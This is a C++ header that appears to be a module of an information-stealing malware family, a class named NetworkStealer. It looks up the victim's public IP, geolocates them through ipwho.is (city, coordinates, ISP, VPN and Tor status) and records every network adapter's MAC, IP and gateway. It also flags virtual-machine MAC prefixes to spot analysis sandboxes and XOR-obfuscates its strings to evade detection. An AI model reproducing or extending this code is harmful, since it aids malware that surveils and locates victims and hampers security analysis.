#pragma once


#include "../http.hpp"
#include "../result.hpp"
#include "../util.hpp"
#include "../xor.hpp"
#include "base.hpp"
#include <iphlpapi.h>
#include <nlohmann/json.hpp>
#include <iomanip>
#include <algorithm>

namespace {
    inline std::string GetVendorFromMAC(const BYTE* mac, DWORD len) {
        if (len < 3) return "Unknown";
        char oui[7];
        sprintf_s(oui, "%02X%02X%02X", mac[0], mac[1], mac[2]);
        static const std::map<std::string, std::string> ouiMap = {
            {"9C6B00", "ASUSTek Computer Inc."},
            {"005056", "VMware, Inc."},
            {"00155D", "Microsoft Hyper-V"},
            {"080027", "Oracle VirtualBox"},
            {"000C29", "VMware (old)"},
            {"001C42", "Parallels"},
            {"D85ED4", "Raspberry Pi Trading Ltd."},

            {"000569", "VMware vSphere"},
            {"001C14", "VMware ESXi"},
            {"005069", "VMware Player"},
            {"0A0027", "VirtualBox (alt)"},
            {"0003FF", "Microsoft Hyper-V (alt)"},
            {"0021F6", "Microsoft Virtual PC"},
            {"0050F2", "Microsoft Virtual"},
            {"525400", "QEMU/KVM"},
            {"00163E", "Xen HVM"},
            {"000F4B", "Virtual Iron"},
        };
        auto it = ouiMap.find(oui);
        return it != ouiMap.end() ? it->second : std::string("Unknown (") + oui + ")";
    }


    inline bool is_vm_mac(const std::string& mac) {

        if (mac.size() < 8) return false;
        std::string prefix = mac.substr(0, 8);
        std::transform(prefix.begin(), prefix.end(), prefix.begin(), ::tolower);


        const std::string vm_prefixes[] = {
            xor("00:05:69"),
            xor("00:0c:29"),
            xor("00:1c:14"),
            xor("00:50:56"),
            xor("08:00:27"),
            xor("0a:00:27"),
            xor("00:03:ff"),
            xor("00:15:5d"),
            xor("00:21:f6"),
            xor("00:50:f2"),
            xor("52:54:00"),
            xor("00:16:3e"),
            xor("00:1c:42"),
            xor("00:0f:4b"),
        };
        for (const auto& vp : vm_prefixes) {
            if (prefix == vp) return true;
        }
        return false;
    }


    inline bool IsVirtualAdapter(const BYTE* mac, DWORD len) {
        if (len < 3) return false;
        char oui[7];
        sprintf_s(oui, "%02X%02X%02X", mac[0], mac[1], mac[2]);
        std::string s(oui);
        return s == "005056" || s == "00155D" || s == "080027" ||
               s == "000C29" || s == "0050F2" || s == "0003FF" ||
               s == "000569" || s == "001C14" || s == "005069" ||
               s == "0A0027" || s == "525400" || s == "00163E" ||
               s == "001C42" || s == "000F4B" || s == "0021F6";
    }
}

class NetworkStealer : public AbstractStealer {
public:
    void steal() override {

        std::string public_ip;
        try {
            auto resp = HTTP::get(xor("https://api.ipify.org"), {});
            if (resp.status == 200) public_ip = resp.body;
        } catch (...) {}

        if (public_ip.empty()) return;


        try {
            std::string url = std::string(xor("https://ipwho.is/")) + public_ip;
            auto resp = HTTP::get(url, {});
            if (resp.status != 200 || resp.body.empty()) return;

            auto data = nlohmann::json::parse(resp.body, nullptr, false);
            if (data.is_discarded()) return;

            append_extra_info("Network:");
            append_extra_info("  IP: " + data.value("ip", "N/A"));
            append_extra_info("  Type: " + data.value("type", "N/A"));

            std::string summary = data.value("city", "?") + ", " +
                data.value("region", "?") + ", " + data.value("country", "?");
            append_extra_info("  Location: " + summary);
            append_extra_info("  Country: " + data.value("country", "N/A") +
                " (" + data.value("country_code", "N/A") + ")");
            append_extra_info("  Region: " + data.value("region", "N/A"));
            append_extra_info("  City: " + data.value("city", "N/A"));
            append_extra_info("  Postal: " + data.value("postal", "N/A"));

            std::ostringstream lat_s, lon_s;
            lat_s << std::fixed << std::setprecision(6) << data.value("latitude", 0.0);
            lon_s << std::fixed << std::setprecision(6) << data.value("longitude", 0.0);
            append_extra_info("  Latitude: " + lat_s.str());
            append_extra_info("  Longitude: " + lon_s.str());

            if (data.contains("connection")) {
                auto conn = data["connection"];
                std::string asn = conn.contains("asn") && conn["asn"].is_number()
                    ? std::to_string(conn["asn"].get<int>())
                    : conn.value("asn", "N/A");
                append_extra_info("  ASN: " + asn);
                append_extra_info("  ISP: " + conn.value("isp", "N/A"));
                append_extra_info("  Organization: " + conn.value("org", "N/A"));
            }

            if (data.contains("timezone")) {
                auto tz = data["timezone"];
                append_extra_info("  Timezone: " + tz.value("id", "N/A") +
                    " (" + tz.value("utc", "N/A") + ")");
            }

            if (data.contains("security")) {
                auto sec = data["security"];
                append_extra_info("  VPN: " + std::string(sec.value("vpn", false) ? "Yes" : "No"));
                append_extra_info("  Proxy: " + std::string(sec.value("proxy", false) ? "Yes" : "No"));
                append_extra_info("  Tor: " + std::string(sec.value("tor", false) ? "Yes" : "No"));
            }
        } catch (...) {}


        append_extra_info("");
        append_extra_info("Adapters:");

        PIP_ADAPTER_INFO pAdapterInfo = (PIP_ADAPTER_INFO)malloc(sizeof(IP_ADAPTER_INFO));
        ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
        if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
            free(pAdapterInfo);
            pAdapterInfo = (PIP_ADAPTER_INFO)malloc(ulOutBufLen);
        }

        if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == NO_ERROR) {
            PIP_ADAPTER_INFO pAdapter = pAdapterInfo;
            while (pAdapter) {
                std::string mac = format_mac_address(pAdapter->Address, pAdapter->AddressLength);
                std::string vendor = GetVendorFromMAC(pAdapter->Address, pAdapter->AddressLength);
                bool isVirtual = IsVirtualAdapter(pAdapter->Address, pAdapter->AddressLength);
                bool vmDetected = is_vm_mac(mac);

                std::string vm_tag = (isVirtual || vmDetected) ? " [VM]" : "";

                append_extra_info("  " + std::string(pAdapter->AdapterName) + vm_tag);
                append_extra_info("    MAC: " + mac);
                append_extra_info("    Vendor: " + vendor);
                append_extra_info("    Type: " + std::string(isVirtual ? "Virtual" : "Physical"));
                append_extra_info("    IP: " + std::string(pAdapter->IpAddressList.IpAddress.String));
                append_extra_info("    Gateway: " + std::string(pAdapter->GatewayList.IpAddress.String));

                pAdapter = pAdapter->Next;
            }
        }
        free(pAdapterInfo);
        append_extra_info("");
    }
};
